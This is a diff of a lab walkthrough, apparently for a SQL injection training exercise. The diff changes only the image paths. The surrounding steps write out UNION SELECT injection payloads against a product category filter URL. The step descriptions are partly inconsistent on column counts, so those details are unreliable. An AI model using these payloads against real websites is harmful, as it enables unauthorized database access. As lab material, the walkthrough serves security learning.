@@ -12,7 +12,7 @@ step 1
 
 click on any category to filter the result and send to repeater
 
-![screnshot](./images/lab4_lifestyle_category.png)
+![screnshot](images/lab4_lifestyle_category.jpg)
 
 step 2
 
@@ -21,7 +21,7 @@ here query returns four columns so you have to use `' UNION SELECT NULL,NULL,NUL
 add  `'+UNION+SELECT+NULL,NULL,NULL--` at the end 
 `/filter?category=Lifestyle'+UNION+SELECT+NULL,NULL,NULL--`
 
-![screnshot](./images/lab4_lifestyle_null_null_null.png)
+![screnshot](images/lab4_lifestyle_null_null_null.jpg)
 
 step 3
 
@@ -38,14 +38,14 @@ first payload
 add `'+UNION+SELECT+'a',NULL,NULL--` at the end
 `/filter?category=Lifestyle'+UNION+SELECT+'a',NULL,NULL--`
 
-![screnshot](./images/lab4_lifestyle_a_null_null.png)
+![screnshot](images/lab4_lifestyle_a_null_null.jpg)
 
 step 4
 
 `/filter?category=Lifestyle'+UNION+SELECT+NULL,'a',NULL--`
 you will notice `a` added in the fourth column
 
-![screnshot](./images/lab4_lifestyle_null_a_null.png)
+![screnshot](images/lab4_lifestyle_null_a_null.jpg)
 
 step 5
 
@@ -54,11 +54,11 @@ replace a with `'RknAON'`
 final payload will be `'+UNION+SELECT+NULL,'RknAON',NULL--` 
 `/filter?category=Lifestyle'+UNION+SELECT+NULL,'RknAON',NULL--`
 
-![screnshot](./images/lab4_lifetyle_a_rknaon_null.png)
+![screnshot](images/lab4_lifetyle_a_rknaon_null.jpg)
 
 step 6
 
 to solve the lab copy  `'+UNION+SELECT+NULL,'RknAON',NULL--` 
 add at the end of URL press enter your lab will solved
 
-![screnshot](./images/lab4_solved_lab.png)
+![screnshot](images/lab4_solved_lab.jpg)
